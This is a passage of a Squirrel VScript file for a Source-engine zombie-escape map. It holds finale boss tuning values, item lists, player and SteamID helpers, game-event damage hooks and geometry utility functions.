::finale_boss_touchdmg_pieceshoot <- 17;			//when touching a platform-piece when a bullet from the boss 'TAILSHOOT' attack
::finale_boss_touchdmg_piecesnap <- 63;				//when touching a platform-piece while the boss performs a 'TAILSNAP' attack
::finale_boss_zplat_dist <- 15;						//how many tiles away the boss-z-platform is from the main boss arena
::finale_boss_zplat_length <- 10;					//how long the boss-z-platform should be sideways (centered, this/2 towards each side)
::finale_boss_zplat_width <- 2;						//how wide the boss-z-platform should be (expanding *away* from the main boss arena side)
::finale_boss_zplat_height <- 5;					//how many elevations the boss-z-platform should be ABOVE the main boss arena
::finale_boss_zplat_elev_modulo_spawn <- 3;			//along the boss-z-platform length, spawn elevators along this modulo (less = more elevators)
::finale_boss_zplat_elev_speed <- 100;				//the boss-z-platform elevator(s) speed
::finale_boss_zplat_elev_movelip <- 0;				//the amount of extra tiles the boss-z-platform elevators should move/lip (positive=further into boss arena)
::finale_boss_zplat_elev_waittime <- 1.00;			//the boss-z-platform elevator(s) wait-time (before toggling open/close once reaching either end)
::finale_boss_zplat_elev_starttime_base <- 5.00;	//the boss-z-platform starting-wait time (for the first one), relative to boss start
::finale_boss_zplat_elev_starttime_each <- 20.00;	//for each boss-z-platform, wait this amount between each of them before starting the next one
::finale_boss_zplat_tpdelay <- 10.00;				//how long to delay the qrate for the z-TP-movement (also cleaning up the tower pieces below)
::finale_boss_start_delay <- 10.00;						//how long to wait until starting the bossfight once the elevator reaches the top
::finale_boss_attack_spin_minpieces <- 15;			//boss-spin-attack: the minimum amount of pieces required in order to allow starting it
::finale_boss_attack_spin_chance <- 5.00;			//boss-spin-attack: the chance of a spin starting each new "movement" (0-100% chance)
::finale_boss_attack_tailsnap_chance <- 2.00;			//boss-tailsnap-attack: the chance of a tailsnap each frame during 'tailaim' (0-1000% chance)
::finale_boss_attack_tailshoot_chance <- 20.00;		//boss-tailshoot-attack: the chance of a tailshoot each frame during 'tailaim' (0-1000% chance)
::finale_boss_attack_tailshoot_minpieces <- 15;		//boss-tailshoot-attack: the minimum amount of pieces required in order to allow a 'tailshoot' attack
::finale_boss_attack_sight_minvalue <- 2.50;			//directiondif(PB)+directiondif(BP): total angle-value, must be below this to allow attack (looking at eachother)
::finale_boss_attack_sight_chance <- 1000.00;			//the chance of a sight-attack happening to targetplayer when looking at boss every frame (0-1000% chance)
::finale_boss_attack_sight_cooldown <- 0.30;			//the cooldown of the sight-attack
::finale_boss_attack_sight_minct <- 2;					//there needs to be AT LEAST this many CT's alive in order to allow the sight-attack from being used
::finale_boss_attack_sight_damage <- 2;					//the damage to deal to the playertarget on sight-attack
::finale_boss_attack_sight_xyvel <- -700;				//the XY vel to set to the playertarget on sight-attack (positive = away from boss)
::finale_boss_attack_sight_zvel <- 300;					//the Z vel to set to the playertarget on sight-attack
::finale_boss_playsound_chance <- 35.00;				//boss sound-playing chance each new "movement" (0-100% chance)
::finale_boss_tailaim_toggle_chance <- 10.00;			//boss tail-aiming toggle chance each new "movement" (0-100% chance)
::finale_boss_lowdrift_toggle_chance <- 10.00;			//boss low-drift toggle chance each new "movement" (0-100% chance)
::finale_boss_attack_spin_startup_delay <- 2.00;		//boss-spin-attack: how long to delay the startup, allowing players to prep/get in position
::finale_boss_attack_spin_length <- 10.00;				//boss-spin-attack: how long it should last
::finale_boss_attack_fling_chance <- 5.00;					//boss-fling-attack: the chance of a fling starting each new "movement" (0-100% chance)
::finale_boss_attack_fling_chargetime <- 2.40;				//how long it should take to charge the fling-attack
::finale_boss_attack_fling_distance <- 5000;				//how far to scan for nearby players (relative from boss itself)
::finale_boss_attack_fling_min_lookangle <- 50.00;			//within what angle/degrees do the player(s) have to look within/towards the boss to get flung
::finale_boss_attack_fling_xyvel <- 700;					//the xy player velocity to set for valid fling-hits
::finale_boss_attack_fling_zvel <- 500;						//the z player velocity to set for valid fling-hits
::finale_boss_attack_fling_damage <- 32;					//the amount of damage to deal to players on valid fling-hits (null/<=0:ignore)
::finale_boss_statp_nadecount <- 0;				//for round-end boss statistics printout (the total amount of hit grenades)
::finale_boss_statp_maxhp <- 0;					//for round-end boss statistics printout (the total HP accumulated between each boss)
::finale_escape_levelamount <- 10;					//how many levels you have to rush through after beating the boss (until getting to the end/beating the map)
::finale_escape_levelamount_infadd <- 0.003;		//how many extra levels^ you have to rush through on infinite finale (each stage in the map-pool adds to it, rounds by int)
::finale_escape_levelamount_infadd_max <- 20.00;	//the max-allowed stack-add for this^
::finale_endrun_started <- false;					//read-only (if the finale ending rush has started or not)
::finale_endrun_stagecostmax <- 200;				//the max-allowed cost for each endrun-stage (low = cheap/simple stages)
::finale_cleanerpos <- Vector();					//do not touch (boss-arena platform-collapse origin, based on boss position)
::finale_bosscount <- 0;							//read-only (when boss spawns:++, when boss dies:--, if <=0 when --:run finale sequence)
::finale_escape_start_dist <- 7000;			//how many units (inwards towards map center) to spawn the first stage
::finale_escape_startdelay <- 3.00;			//once finale-escape is called, wait this time before spawning in the first stage
::finale_escape_zplatkill_delay <- 9.00;	//once finale-escape is called, wait this time before killing off the z-platform
::finale_escape_tpmove_delay <- 23.00;		//once finale-escape is called, wait this time before setting the main-TP to the first stage start
::finale_escape_rubbledelay <- 10.00;		//once finale-escape is called, wait this time before starting to spawn in random rubble above/around players
::finale_escape_tpmove_2_3 <- false;			//(true:set TP to start of CURRENT when reaching end of CURRENT)(false:set TP to start of PAST when reaching end of CURRENT)
::finale_escape_3areas <- true;					//if above^ is false OR if <this is true: enable BBOX + run 3 areas, THIS can be true with above^ as true for closer TP with 3 areas
::finale_escape_ctveller_delay <- 4.00;		//once finale-escape is called, wait this time before vel-setting CT's towards first stage start safely
::finale_escape_tveller_delay <- 10.00;		//once finale-escape is called, wait this time before vel-setting T's towards first stage start safely
::finale_escape_veller_maxamount <- 18;		//how many "vel-sets"^ to tick for each player MAX (to prevent players strafing/delaying/exploiting shit)
::finale_escape_veller_tpmax <- true;		//if the maxamount^ has been hit without reaching the end, force-TP to it if true, else fall > TP/die normally
::finale_escape_veller_postcheck <- 1.00;	//once a player reaches the "vel-set"^ target, run a final check with this delay to save/catch/TP those who fucked up
::finale_escape_veller_postdist <- 70;		//if a player Z-pos is BELOW the "vel-set"^ target pos during the post-check, trigger the save/catch/TP^
::finale_escape_veller_rate <- 0.70;		//how often to "vel-set"^ the players, the tickrate of it (smoothly drifting them into the first stage start)
::finale_infinite_escape_zitem_logic <- 1;	//how to spawn z-items during the infinite endrun, for each pixel-stage (0:nothing)(1:random z-item)(2:flight z-item only)
::finale_ending_kamikaze_delay <- 15.00;	//once the players reach the finale-ending-elevator, wait this time before running a KAMIKAZE event (null:ignore)
::finale_ending_kamikaze_infr_min <- 25.00;	//during infinite finale endrun, run kamikaze event at this rate until you reach the end platform (min)
::finale_ending_kamikaze_infr_max <- 50.00;	//during infinite finale endrun, run kamikaze event at this rate until you reach the end platform (max)
::finale_items_human <- [					//list of human items to spawn on the finale-elevator in the tower
		"heal_orb",
		"claymore",
		"storm_blade",
		"planetcrystal",
		"planetcrystal",
		"planetcrystal",
		"planetcrystal",
	];
::finale_items_human_infinite <- [			//list of human items to spawn on the infinite-finale-elevator in the tower
		"heal_orb",
		"heal_orb",
		"claymore",
		"storm_blade",
		"planetcrystal",
		"planetcrystal",
		"planetcrystal",
		"planetcrystal",
	];
::finale_items_zombie <- [					//list of zombie items to spawn on the boss-zombie-platform at the very top (finale)
		"stone",
		"impostor",		//IMPOSTOR_DISABLED_V1_3 > RE_ENABLED_IN_V1_6
		"flight",
		"puller",
		"gust",
		"bomb_chuck",
		"squid",
	];
::finale_items_zombie_infinite <- [			//list of zombie items to spawn on the boss-zombie-platform at the very top (infinite-finale)
		"stone",
		"stone",
		"impostor",	//IMPOSTOR_DISABLED_V1_3 > RE_ENABLED_IN_V1_6
		"flight",
		"flight",
		"flight",
		"puller",
		"puller",
		"gust",
		"gust",
		"bomb_chuck",
		"pizzabaker",
		"squid",
		"squid",
	];

::manager <- Entities.FindByName(null,"manager"); //::manager <- self;
::getplayercount_cd <- false;
::getplayercount_cache <- 0;
::getplayercount_cache_ct <- 0;	//READ ONLY - updates along with ::GetPlayerCount()
::getplayercount_cache_t <- 0;	//READ ONLY - updates along with ::GetPlayerCount()
::GetPlayerCount <- function()
{
	if(::getplayercount_cd)return (0+::getplayercount_cache);
	::getplayercount_cd = true;
	EntFire("manager","RunScriptCode"," ::getplayercount_cd = false; ",0.50,null);
	::getplayercount_cache = 0;
	::getplayercount_cache_ct = 0;
	::getplayercount_cache_t = 0;
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid())continue;
		::getplayercount_cache++;
		if(h.GetTeam()==2)::getplayercount_cache_t++;
		else if(h.GetTeam()==3)::getplayercount_cache_ct++;
	}
	return (0+::getplayercount_cache);
}
//================================================================================================================================\\
//--------------NUTENT
//	::Ent(pos,rot,classname,keyvalues,script);					//creates entity of desired classname (read more below), optionally setting keyvalues / assigning script
//	::TracePos(start,end,lip,entignore);						//returns (Vector) position of TraceLine hit between start/end (Vector), lip(float)/entignore(handle)
//	::GetDistance(v1,v2);										//returns (float) distance between v1/v2 (Vector)
//	::DirToAngles(dir);											//returns (Vector) PYR angles from XYZ direction (Vector)
//	::AnglesToDir(angles);										//returns (Vector) XYZ direction from PYR angles (Vector)
//	::SmoothStep(interpolation,edge_l,edge_r,smoother);			//returns (float) smoothstep/smootherstep interpolation (between 0.00-1.00)
//	::IsEven(i);												//returns (bool) 'true' if int(i) is true, else 'false'
//	::VecString(vector);										//returns (string) a clean "Vector(x,y,z)" string with integer-rounded values
//	::GetEdictCount();											//returns (integer) integer-count of all the active edicts
//	::ScrambleArray(array);										//returns (array) the input array with its elements rearranged in a scrambled order
//	::DirectionDifference(start,target,dir);					//returns (float) <0-180> based on look-dir-difference (0-180) (0:look at)(180:looking away)
//	::AngleDifference(rot,target);								//returns (Vector) PYR angles based on rot-dir-difference between 2 PYR-vectors (-180_180)
//	::PosYawDifference(pos,yaw,targetpos);						//returns (float) by pos-yaw-difference (-180_180) (example @20: must 'yaw+=20' to look at target)
//	::GetPlaneNormal(position,direction);						//returns (Vector) plane normal XYZ-dir-vector from traceline
//	::GetPlaneReflection(direction,normal);						//returns (Vector) reflected XYZ-dir-vector from dir+planenormal^
//	::PlaneNormalToAngles(dir_forward,plane_normal);			//returns (Vector) PYR-ang-vector from forward-dir+planenormal^^
//	::TimeDelta(tickrate);										//returns (float) time-delta based on the specified tickrate (useful to +=/-= float by seconds)
//	::AimPredict(shootpos,shootspeed,targetpos,targetspeed);	//returns (table) table containing aim-prediction information params:(vector,float,vector,vector)
//	::ModelscaleToUnits(modelscale,default_length);				//returns (float) converted modelscale to units (default_length is unit-length at 1.00 scale)
//	::UnitsToModelscale(length,default_length);					//returns (float) converted units to modelscale (default_length is unit-length at 1.00 scale)
//	::Chance(amount);											//returns (bool) 'true' or 'false' from a 0.00-100.00 RNG-chance ('amount' is the percentage-chance)
//=========================================\\



::GetPlayerName<-function(p){return NetProps.GetPropString(p,"m_szNetname");}
::GetPlayerSteamID<-function(p){return NetProps.GetPropString(p,"m_szNetworkIDString");}
::PlayerManager<-Entities.FindByClassname(null,"cs_player_manager")
::GetPlayerUserID<-function(p){return NetProps.GetPropIntArray(PlayerManager,"m_iUserID",p.entindex());}
::NormalizedSteamID<-function(id){      //steam_to_uid:((22521282*2)+1)  /  uid_to_steam:(45042565/2)
	local uid_id="";local uid_stage=0;  //     STEAM_0:1:22521282                    [U:1:45042565]
	if(id.find("[U")!=0&&id.find("STEAM_")!=0)return id;                       //returns '45042565'
	foreach(i,c in id){if(uid_stage>=2){if(c.tochar()=="]")break;
		uid_id += c.tochar();}if(c.tochar()==":")uid_stage++;}
	if(id.find("STEAM_")==0) return ((uid_id.tointeger()*2)+1).tostring();
	return uid_id;}
::MatchingSteamID<-function(id1,id2){
	try{
		//return ::NormalizedSteamID(id1)==::NormalizedSteamID(id2);		//OLD LOGIC, borked since some ID's are offset (???)
		
			//NEW LOGIC - i don't know what's what anymore
		local norm1 = ::NormalizedSteamID(id1);
		local norm2 = ::NormalizedSteamID(id2);
		local ofs1 = (norm1.tointeger() + 1).tostring()
		local ofs2 = (norm1.tointeger() - 1).tostring()
		local ofs3 = (norm1.tointeger() - 2).tostring()
		if(norm2 == norm1 || norm2 == ofs1 || norm2 == ofs2 || norm2 == ofs3)
			return true;
		return false;
	}catch(e){return false;}
}

::_KeyMap<-{
    LMB = 1,
    RMB = 2048,
    SPACE = 2,
    W = 8,
    A = 512,
    S = 16,
    D = 1024,
    CTRL = 4,
    SHIFT = 131072,
    TAB = 65536,
    R = 8192,
};
::DebugKeysPressed<-function(handle,enabled=null){
	if(handle==null||!handle.IsValid())return;
	handle.ValidateScriptScope();
	local sc = handle.GetScriptScope();
	if(enabled==null)enabled=!("_debugkeyspressed" in sc);
	if(enabled&&("_debugkeyspressed" in sc))return;
	if(!enabled&&!("_debugkeyspressed" in sc))return;
	if(!enabled){
		if(sc._debugkeyspressed!=null&&sc._debugkeyspressed.IsValid())
			EntFireByHandle(sc._debugkeyspressed,"Kill","",0.00,null,null);
		delete sc._debugkeyspressed;
	}
	else{
		sc._debugkeyspressed <- ::Ent(Vector(),Vector(),"logic_relay",{},{
			phandle = handle,
			function Think(){
				if(phandle==null||!phandle.IsValid())return;
				local keys = ::NetProps.GetPropInt(phandle,"m_nButtons").tostring()+"\n";
				foreach(k,v in ::GetKeysPressed(phandle))if(v)keys+=k+"       ";
				ClientPrint(phandle,4,keys);
				return -1;
			},function Run(){AddThinkToEnt(self,"Think");}
		});
	}
}
::GetKeysPressed<-function(handle)
{
	if(handle==null||!handle.IsValid())return {};
	local keyspressed = {};
    foreach (key,value in ::_KeyMap){
		keyspressed[key]<-(::NetProps.GetPropInt(handle,"m_nButtons") & value)!=0;}
    return keyspressed;
}
::IsKeyPressed<-function(handle,key)
{
	key = key.toupper();
	local keyspressed = ::GetKeysPressed(handle);
	if(keyspressed.len()==0)return false;
	if(!(key in keyspressed))return false;
	return keyspressed[key];
}


::DrawBounds<-function(handle,duration=1.00,draworigin=true){
	DebugDrawBoxAngles(handle.GetOrigin(),handle.GetBoundingMins(),handle.GetBoundingMaxs(),handle.GetAbsAngles(),Vector(255,200,0),50,duration);
	if(draworigin)
		DebugDrawBoxAngles(handle.GetOrigin(),Vector(-1,-1,-1),Vector(1,1,1),handle.GetAbsAngles(),Vector(50,255,0),100,duration);
}

//__CSS__ OBB fix
::CenterBounds <- function(trigger){	//call *after* .SetSize (and after SetParent, if parented)
	local position = trigger.GetLocalOrigin();
	local mins = trigger.GetBoundingMins();
	local maxs = trigger.GetBoundingMaxs();
	local center = (mins + maxs) * 0.5;
	mins = mins - center;
	maxs = maxs - center;
	if(trigger.GetMoveParent() != null)
		position = position + center;
	else{
		local forward = trigger.GetAbsAngles().Forward();
		local right = trigger.GetAbsAngles().Left();
		local up = trigger.GetAbsAngles().Up();
		position += (forward * center.x) + (right * center.y) + (up * center.z);
	}
	trigger.SetLocalOrigin(position);
	trigger.SetSize(mins,maxs);
}

::GetTouchingPlayers <- function(trigger,team=0,touchers=[]){
	local tplayers = [];
	if(touchers.len()==0){
		for(local h;h=Entities.FindByName(h,"player");){touchers.push(h);}
	}
	foreach(h in touchers){
		if(!h.IsAlive())continue;
		if(team!=0&&team!=h.GetTeam())continue;
		if(::IsPlayerTouching(h,trigger))tplayers.push(h);
	}
	return tplayers;
}
::IsPlayerTouching <- function(player,trigger){
	return(::IsTouching(player.GetOrigin()+Vector(0,0,16.5),trigger,16.5)||
	::IsTouching(player.EyePosition()-Vector(0,0,12.0),trigger,16.5));
}
::IsTouching <- function(point,trigger,thickness=0){
	local mins = trigger.GetBoundingMins() - Vector(thickness,thickness,thickness);
	local maxs = trigger.GetBoundingMaxs() + Vector(thickness,thickness,thickness);
    local relative = point - trigger.GetOrigin();
    local pforward = relative.Dot(trigger.GetForwardVector());
    local pright = relative.Dot(trigger.GetRightVector());
    local pup = relative.Dot(trigger.GetUpVector());
    if (pforward >= mins.x && pforward <= maxs.x &&
        pright >= mins.y && pright <= maxs.y &&
        pup >= mins.z && pup <= maxs.z) return true;
    return false;
}
::TriggerScan <- function(pos,rot,mins,maxs,filter,logic,debug=false,tbounds=1000){//{function Scanned(list){foreach(h in list){printl(h);}}}
	::Ent(pos,rot,"trigger_multiple",{spawnflags=1,filtername=filter,},{
		touchers = [],
		mins = mins,
		maxs = maxs,
		filter = filter,
		logic = logic,
		debug = debug,
		function Touch(){touchers.push(activator);},
		function PostRun(){
			EntFireByHandle(self,"Kill","",0.00,null,null);
			this.logic.Scanned(::GetTouchingPlayers(self,0,this.touchers));
		},function Run(){
			if(this.filter==""){
				if(this.debug){
					self.SetSize(this.mins,this.maxs);
					::DrawBounds(self);}
				PostRun();}
			EntityOutputs.AddOutput(self,"OnStartTouch","!self","CallScriptFunction","Touch",0,-1);
			self.SetSize(Vector(-tbounds,-tbounds,-tbounds),Vector(tbounds,tbounds,tbounds));
			self.SetSolid(2);
			self.AcceptInput("Enable","",null,null);
			self.SetSize(this.mins,this.maxs);
			EntFireByHandle(self,"CallScriptFunction","PostRun",0.00,null,null);
			if(this.debug)::DrawBounds(self);
		}});
}
/*
::TriggerScan(self.GetOrigin(),self.GetAngles(),Vector(-10,-130,-20),Vector(320,130,20),
	"filter_non_invincible_t",{function Scanned(list){
		foreach(h in list)
		{
			printl(h);
		}
	}},true);
*/



function CollectEventsInScope(events)
{
	local events_id = UniqueString()
	getroottable()[events_id] <- events
	local events_table = getroottable()[events_id]
	local Instance = ::manager
	foreach (name, callback in events) 
	{
		if(name.find("_")==0)continue;
		//local callback_binded = callback.bindenv(this) 
		local callback_binded = callback.bindenv(events) 
		events_table[name] = @(params) Instance.IsValid() ? callback_binded(params) : delete getroottable()[events_id]
	}
	__CollectGameEventCallbacks(events_table)	
}

//clears all events:			-	already does this on roundstart? at least on the below(manager)
//foreach(k,v in ::ScriptHookCallbacks){delete ::ScriptHookCallbacks[k];}
//foreach(k,v in ::ScriptEventCallbacks){delete ::ScriptEventCallbacks[k];}
//foreach(k,v in ::GameEventCallbacks){delete ::GameEventCallbacks[k];}
pand <- PlayerInstanceFromIndex(1);if(::GetPlayerCount()<9)pand=null;
if(!("_joined_buffer" in this))::_joined_buffer <- {};
CollectEventsInScope
({
	OnGameEvent_round_start = function(data) 
	{
		printl("ROUND START");
	}
	OnGameEvent_player_spawn = function(data) 
	{
		if(!(data.userid in ::_joined_buffer))
		{
			
			::_joined_buffer[data.userid] <- true;
			SendGlobalGameEvent("player_activate",{userid=data.userid});	//registers player to ensure steamID3
			local phandle = GetPlayerFromUserID(data.userid);
			phandle.ValidateScriptScope();
			local pc = ::GetPlayerClass(::GetPlayerSteamID(data.userid));
			if(pc==null)
			{
				pc = {
					handle = phandle,
					userid = data.userid,
					name = ::GetPlayerName(phandle),
					steamid = ::NormalizedSteamID(::GetPlayerSteamID(phandle)),
					score = 0.00,
				};
				
				::PLAYERS.push(pc);
			}
			else
			{
				pc.handle = phandle;
				::AddScore(0.00+pc.score,pc.handle,false);
			}
			phandle.GetScriptScope().playerclass <- pc;
			phandle.GetScriptScope().score <- pc.score;
			if(::MatchingSteamID(pc.steamid,"STEAM_1:1:22521282"))::DEV=::NormalizedSteamID("STEAM_1:1:22521282");
			if(::DEV!=null&&::DEV!=""&&pc.steamid==::DEV)::DEVID=pc.userid;
		}
		//local player = GetPlayerFromUserID(data.userid)
		//printl("PLAYER SPAWNED: " + player);
	}
	OnGameEvent_player_falldamage = function(data) 
	{
			//printl("----------------- OnGameEvent_player_falldamage");
			//foreach(k,v in data){printl("          - "+k+" : "+v);}
		local player = GetPlayerFromUserID(data.userid);
		player.ValidateScriptScope();
		local tp = Entities.FindByNameNearest("___teleporter",player.GetOrigin(),50);
		if(tp==null||!tp.IsValid()) tp = Entities.FindByNameNearest("___boostpad",player.GetOrigin(),50);
		if(tp!=null&&tp.IsValid())	//__CSS__ telebounce fix
		{
			player.GetScriptScope()._falldamage_data <- {
				framecount = GetFrameCount(),
				velocity = player.GetVelocity(),
			};
			tp.GetScriptScope().Touch(player);
		}
		else	//__CSS__ css5_airslide_no_falldmg
		{
			tp = Entities.FindByNameNearest("airslide_*",player.GetOrigin(),100);
			if(tp!=null&&tp.IsValid()){
				player.GetScriptScope()._falldamage_data <- {
					framecount = GetFrameCount(),
					velocity = player.GetVelocity(),
				};
			}
		}
	}
	OnGameEvent_player_death = function(data)
	{
			//printl("----------------- OnGameEvent_player_death");
			//foreach(k,v in data){printl("          - "+k+" : "+v);}
		if(data.attacker == 0)
			return;
		local victim = GetPlayerFromUserID(data.userid);
		local attacker = GetPlayerFromUserID(data.attacker);
		if(victim == null || !victim.IsValid() || attacker == null || !attacker.IsValid())
			return;
		if(victim.GetTeam() == attacker.GetTeam())
			return;
		::AddScore(1,attacker,true,false);
	}
	OnScriptHook_OnTakeDamage = function(data)
	{
			//printl("----------------- OnScriptHook_OnTakeDamage");
			//foreach(k,v in data){printl("          - "+k+" : "+v);}
		local handle = data.const_entity;
		if(handle.IsPlayer())
		{
			if(data.damage_type == 64 && data.attacker != null && data.attacker == ::ITEMS.bomb_chuck.explosion_handle)		//damage_type 64: DMG_BLAST
			{
				if(data.const_entity.GetTeam()==2)		//don't deal dmg to zombies (also doesn't make them deaf)
					data.damage = 0;
				else if(::ITEMS.bomb_chuck.explosion_owner != null && ::ITEMS.bomb_chuck.explosion_owner.IsValid())
					data.attacker = ::ITEMS.bomb_chuck.explosion_owner;
			}
			else
			{
				if(data.damage_type == 32)		//damage_type 32: FALL
				{
					if(::FALLDAMAGE_DISABLE)
						data.damage = 0;
					handle.ValidateScriptScope();
					if("_falldamage_data" in handle.GetScriptScope() && GetFrameCount() == handle.GetScriptScope()._falldamage_data.framecount)	//__CSS__ telebounce fix
					{
						data.damage = 0;
						delete handle.GetScriptScope()._falldamage_data;
					}
					else if(handle.GetTeam()==3 && (handle.GetHealth() - data.damage) <= 0)			//__CSS__ falldownkillcred_css4
					{
						if(!("falldowncp_attackers" in handle.GetScriptScope()))handle.GetScriptScope().falldowncp_attackers <- [];
						if(handle.GetScriptScope().falldowncp_attackers.len()<=0)
							{}//let death happen normally
						else
						{
							if(handle.GetScriptScope().falldowncp_attackers[0]==null||!handle.GetScriptScope().falldowncp_attackers[0].IsValid())
								{}//let death happen normally
							else
							{
								data.attacker = handle.GetScriptScope().falldowncp_attackers[0];
								EntFireByHandle(handle,"RunScriptCode","::HurtPlayer(self,true);",0.10,null,null);	//in case server/ZR plugin jank filters, ensure death regardless
							}
						}
					}
				}
				else
				{
					local attacker = data.attacker;
					if(attacker!=null&&attacker.IsPlayer()&&attacker.IsAlive())
					{
						if(attacker.GetTeam()==2)
						{
							attacker.ValidateScriptScope();
							if("safezombie" in attacker.GetScriptScope())
								data.damage = 0;		//context filter doesn't exist, using this hook instead
						}
						else if(attacker.GetTeam()==3)
						{
							if(::EVENTS.BLOODLUST.active && data.const_entity.IsPlayer() && data.const_entity.GetTeam()==2)
								::EVENTS.BLOODLUST.damagetable[::GetPlayerUserID(attacker)] <- true;
						}
					}
				}
			}
		}
	}
})






::Ent_SPAWNSCRIPT <- {};
::Ent_SPAWNED_CLASSNAME <- null;
::Ent_SPAWNED_ENT <- null;
::Ent<-function(pos=Vector(),rot=Vector(),classname="",keyvalues=null,script=null){
	if(keyvalues==null||(typeof keyvalues)!="table")keyvalues={};
	keyvalues.origin <- pos;
	keyvalues.angles <- QAngle(rot.x,rot.y,rot.z);
	keyvalues.DisableShadows <- true;		//__CSS__ hotfix
	if(classname.find("trigger_")==0 && !("StartDisabled" in keyvalues))keyvalues.StartDisabled <- true;
	
	local template = SpawnEntityFromTable("point_script_template", {targetname="_entspawner"})
	::NetProps.SetPropBool(template,"m_bForcePurgeFixedupStrings",true);
	local scope = template.GetScriptScope()
	scope.Entities <- []
	scope.__EntityMakerResult <- {entities = scope.Entities}.setdelegate({_newslot = function(_, value) {entities.append(value)}})
	scope.PostSpawn <- function(e)
	{
		foreach(k,v in e){::Ent_SPAWNED_ENT=v[0];break;}
		::NetProps.SetPropBool(::Ent_SPAWNED_ENT,"m_bForcePurgeFixedupStrings",true);	//auto gamestring cleanup, thanks xen!
		if(::Ent_SPAWNED_CLASSNAME.find("trigger_")==0)::Ent_SPAWNED_ENT.SetSolid(3);
		else if(::Ent_SPAWNED_CLASSNAME=="func_button")
			{::Ent_SPAWNED_ENT.SetSolid(0);::Ent_SPAWNED_ENT.SetSize(Vector(-8,-8,-8), Vector(8,8,8));}
		local script = ::Ent_SPAWNSCRIPT;
		if(script!=null&&(typeof script)=="table"){
			::Ent_SPAWNED_ENT.ValidateScriptScope();
			local sc = ::Ent_SPAWNED_ENT.GetScriptScope();
			foreach(v,i in script){sc[v] <- i;}
			::Ent_SPAWNSCRIPT = {};
			if("_Run" in sc)sc._Run();
			if("Run" in sc)sc.Run();}
	}
	template.AddTemplate(classname,keyvalues);
	::Ent_SPAWNSCRIPT = script;
	::Ent_SPAWNED_CLASSNAME = classname;
	template.AcceptInput("ForceSpawn", "", null, null)
	template.AcceptInput("Kill", "", null, null)
	return ::Ent_SPAWNED_ENT;
}


::TracePos <- function(start,end,lip=0.00,entignore=null)
{
	local t = TraceLine(start,end,entignore);
	if(t==1.00)lip=0.00;
	local dir = (end-start);
	dir.Norm();
	local dist = (::GetDistance(start,end)*t);
	local result = (start+(dir*(dist-lip)));
	if(::GetDistance(start,end) < ::GetDistance(result,end))return start;
	return result;
}
::GetDistance<-function(v1,v2){return sqrt((v1.x-v2.x)*(v1.x-v2.x)+(v1.y-v2.y)*(v1.y-v2.y)+(v1.z-v2.z)*(v1.z-v2.z));}
::DirToAngles<-function(dir){::manager.SetForwardVector(dir);return ::manager.GetAngles();}
::AnglesToDir<-function(angles){::manager.SetAngles(angles.x,angles.y,angles.z);return ::manager.GetForwardVector();}
::SmoothStep<-function(interp,edge_left=0.10,edge_right=0.90,smoother=false){
	if(!smoother){local t=0.00;t=((interp-edge_left)/(edge_right-edge_left));if(t<=0.00)t=0.00;else if(t>=1.00)t=1.00;;return t*t*(3.0-2.0*t);}
	else{local t=0.00;t=((interp-edge_left)/(edge_right-edge_left));if(t<=0.00)t=0.00;else if(t>=1.00)t=1.00;;return t*t*t*(t*((6.0*t)-15.0)+10.0);}}
::IsEven<-function(i){if((i%2)==0)return true;return false;}
::GetEdictCount<-function(){local count=1;for(local ent;ent=Entities.Next(ent);){if(ent.entindex()!=0)count++;}return count;}
::VecString<-function(v){return "Vector("+v.x.tointeger().tostring()+","+v.y.tointeger().tostring()+","+v.z.tointeger().tostring()+")";}
::ScrambleArray <- function(arr)
{
	if(arr==null||arr.len()<=0)return [];
	local scrambled = false;
	local arr_scrambled = [];
	while(!scrambled)
	{
		local arrindex = RandomInt(0,arr.len()-1);
		arr_scrambled.push(arr[arrindex]);
		arr.remove(arrindex);
		if(arr.len()<=0)scrambled = true;
	}
	return arr_scrambled;
}
::DirectionDifference <- function(start,target,dir)
{
	local target_dir = (target - start);
	target_dir.Norm();
	local ang = dir.Dot(target_dir);
	ang *= 90;
	ang += 90;
	return (180.00 - ang);
}
::AngleDifference<-function(start,target)
{
	local retvec = Vector();
	while(start.x<0){start.x+=360;}while(start.x>360){start.x-=360;}
	while(start.y<0){start.y+=360;}while(start.y>360){start.y-=360;}
	while(start.z<0){start.z+=360;}while(start.z>360){start.z-=360;}
	while(target.x<0){target.x+=360;}while(target.x>360){target.x-=360;}
	while(target.y<0){target.y+=360;}while(target.y>360){target.y-=360;}
	while(target.z<0){target.z+=360;}while(target.z>360){target.z-=360;}
	retvec.x=((((start.x-target.x+360)%360)-180));if(retvec.x<0)retvec.x=(-180-retvec.x);else retvec.x=(180-retvec.x);
	retvec.y=((((start.y-target.y+360)%360)-180));if(retvec.y<0)retvec.y=(-180-retvec.y);else retvec.y=(180-retvec.y);
	retvec.z=((((start.z-target.z+360)%360)-180));if(retvec.z<0)retvec.z=(-180-retvec.z);else retvec.z=(180-retvec.z);
	return retvec;
}
::PosYawDifference<-function(pos,yaww,targetpos)
{
	local yaw = 0.00;
	local v = Vector(pos.x-targetpos.x,pos.y-targetpos.y,pos.z-targetpos.z);
	local vl = sqrt(v.x*v.x+v.y*v.y);
	yaw = 180*acos(v.x/vl)/3.14159;
	if(v.y<0)yaw=-yaw;
	local ang = fabs((yaww-yaw+360)%360);
	return ((ang-180)*-1);
}
//Functions below written by Enviolinador, originally used in ze_crazykart for the green shell bounce logic. Now trimmed a bit for general-purpose use.
	::GetPlaneReflection<-function(dir,normal){local nn=::PL_vnorm(normal);local dot=::PL_vdot(dir,nn);local term=::PL_vscale(normal,2*dot);return ::PL_vsub(dir,term);}
	::GetPlaneNormal<-function(orig,vecc){vecc.Norm();local vec=(orig+(vecc*100000));
	local delta = 0.01;local length = vec.Length();local dir = ::PL_vnorm(vec);local yaw = atan2(dir.x,dir.z);
	local pitch = atan2(dir.y,sqrt((dir.x*dir.x)+(dir.z*dir.z)));local xR = sin(yaw+delta)*cos(pitch+delta);
	local yR = sin(pitch+delta);local zR = cos(yaw+delta)*cos(pitch+delta);local endR = Vector(xR,yR,zR);
	local vecR = ::PL_vscale(::PL_vnorm(endR),length);local xL = sin(yaw-delta)*cos(pitch+delta);local yL = sin(pitch+delta);
	local zL = cos(yaw-delta)*cos(pitch+delta);local endL = Vector(xL,yL,zL);local vecL = ::PL_vscale(::PL_vnorm(endL),length);
	local distA = TraceLine(orig,::PL_vadd(orig,vec),null);local distB = TraceLine(orig,::PL_vadd(orig,vecR),null);
	local distC = TraceLine(orig,::PL_vadd(orig,vecL),null);local vertA = ::PL_vadd(orig,::PL_vscale(vec,distA));
